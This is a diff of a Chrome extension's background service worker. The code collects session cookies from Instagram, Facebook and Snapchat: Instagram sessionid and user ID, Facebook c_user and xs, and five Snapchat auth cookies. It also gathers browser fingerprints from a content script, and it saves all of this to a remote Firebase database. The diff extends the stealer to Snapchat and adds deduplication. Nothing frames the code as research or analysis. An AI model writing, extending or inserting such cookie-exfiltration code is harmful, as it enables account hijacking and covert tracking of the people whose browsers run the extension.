@@ -1,22 +1,51 @@
 console.log("🚀 Service Worker Loaded ✅");
 
-import { db, collection, addDoc } from "./firebase.js";
+import { db } from "./firebase-init.js";
+import { collection, addDoc } from "./firebase-firestore.js";
+import { isDuplicateData } from "./utils.js";
 
+// 📥 Listen for fingerprint messages
+chrome.runtime.onMessage.addListener(async (message) => {
+  if (message.type === "fingerprint") {
+    const data = message.data;
+    console.log("📥 Received fingerprint from content script:", data);
+
+    const colRef = collection(db, "Fingerprints");
+    const isDuplicate = await isDuplicateData(colRef, data);
+
+    if (isDuplicate) {
+      console.log("🛑 Duplicate fingerprint data found — Not saved.");
+      return;
+    }
+
+    await addDoc(colRef, { ...data, timestamp: new Date() });
+    console.log("✅ New fingerprint saved to Firebase.");
+  }
+});
+
+// 🌐 Cookie Handling
 chrome.webNavigation.onCompleted.addListener(
   async (details) => {
     const url = details.url;
 
     if (url.includes("instagram.com")) {
-      handleInstagram();
+      await handleInstagram();
     } else if (url.includes("facebook.com")) {
-      handleFacebook();
+      await handleFacebook();
+    } else if (url.includes("snapchat.com")) {
+      await handleSnapchat();
     }
   },
   {
-    url: [{ hostSuffix: "instagram.com" }, { hostSuffix: "facebook.com" }],
+    url: [
+      { hostSuffix: "instagram.com" },
+      { hostSuffix: "facebook.com" },
+      { hostSuffix: "snapchat.com" },
+    ],
   }
 );
 
+// ℹ️ Instagram
 async function handleInstagram() {
   chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
     const session = cookies.find((c) => c.name === "sessionid");
@@ -30,24 +59,30 @@ async function handleInstagram() {
     const sessionId = session.value;
     const userId = dsUserId.value;
 
-    console.log("✅ IG Session ID:", sessionId);
-    console.log("✅ IG User ID:", userId);
+    console.log("🔹 IG Session ID:", sessionId);
+    console.log("🔹 IG User ID:", userId);
 
     const userInfo = await fetchIGUserInfo(sessionId, userId);
 
-    try {
-      await addDoc(collection(db, "instagram"), {
-        platform: "Instagram",
-        sessionId,
-        userId,
-        ...userInfo,
-        timestamp: new Date(),
-        domain: "instagram.com",
-      });
-      console.log("✅ Instagram info saved:", userInfo.username);
-    } catch (err) {
-      console.error("❌ Firebase IG error:", err);
+    const docData = {
+      platform: "Instagram",
+      sessionId,
+      userId,
+      domain: "instagram.com",
+    };
+
+    // ✅ Only check duplicate with sessionId + userId + platform + domain
+    const colRef = collection(db, "instagram");
+    const isDuplicate = await isDuplicateData(colRef, docData);
+
+    if (isDuplicate) {
+      console.log("🛑 Duplicate Instagram data found — Not saved.");
+      return;
     }
+
+    // ✅ Add extra userInfo after checking
+    await addDoc(colRef, { ...docData, ...userInfo, timestamp: new Date() });
+    console.log("✅ New Instagram data saved:", userInfo.username);
   });
 }
 
@@ -94,6 +129,7 @@ async function fetchIGUserInfo(sessionId, userId) {
   }
 }
 
+// 📘 Facebook
 async function handleFacebook() {
   chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
     const cUser = cookies.find((c) => c.name === "c_user");
@@ -104,17 +140,67 @@ async function handleFacebook() {
       return;
     }
 
-    try {
-      await addDoc(collection(db, "facebook"), {
-        platform: "Facebook",
-        c_user: cUser.value,
-        xs: xs.value,
-        timestamp: new Date(),
-        domain: "facebook.com",
-      });
-      console.log("✅ Facebook session saved:", cUser.value);
-    } catch (err) {
-      console.error("❌ Firebase FB error:", err);
+    const docData = {
+      platform: "Facebook",
+      c_user: cUser.value,
+      xs: xs.value,
+      domain: "facebook.com",
+    };
+
+    const colRef = collection(db, "facebook");
+    const isDuplicate = await isDuplicateData(colRef, docData);
+
+    if (isDuplicate) {
+      console.log("🛑 Duplicate Facebook data found — Not saved.");
+      return;
     }
+
+    await addDoc(colRef, { ...docData, timestamp: new Date() });
+    console.log("✅ New Facebook data saved:", cUser.value);
+  });
+}
+
+// 👻 Snapchat
+async function handleSnapchat() {
+  chrome.cookies.getAll({ domain: ".snapchat.com" }, async (cookies) => {
+    const sc_at = cookies.find((c) => c.name === "sc_at");
+    const sc_sid = cookies.find((c) => c.name === "_sc-sid");
+    const blizzard_web_session_id = cookies.find(
+      (c) => c.name === "blizzard_web_session_id"
+    );
+    const sc_nonce = cookies.find((c) => c.name === "sc-a-nonce");
+    const sc_wcid = cookies.find((c) => c.name === "sc-wcid");
+
+    if (
+      !sc_at ||
+      !sc_sid ||
+      !blizzard_web_session_id ||
+      !sc_nonce ||
+      !sc_wcid
+    ) {
+      console.warn("⚠️ One or more Snapchat cookies missing.");
+      return;
+    }
+
+    const docData = {
+      platform: "Snapchat",
+      sc_at: sc_at.value,
+      _sc_sid: sc_sid.value,
+      blizzard_web_session_id: blizzard_web_session_id.value,
+      sc_a_nonce: sc_nonce.value,
+      sc_wcid: sc_wcid.value,
+      domain: "snapchat.com",
+    };
+
+    const colRef = collection(db, "snapchat");
+    const isDuplicate = await isDuplicateData(colRef, docData);
+
+    if (isDuplicate) {
+      console.log("🛑 Duplicate Snapchat data found — Not saved.");
+      return;
+    }
+
+    await addDoc(colRef, { ...docData, timestamp: new Date() });
+    console.log("✅ New Snapchat data saved.");
   });
 }
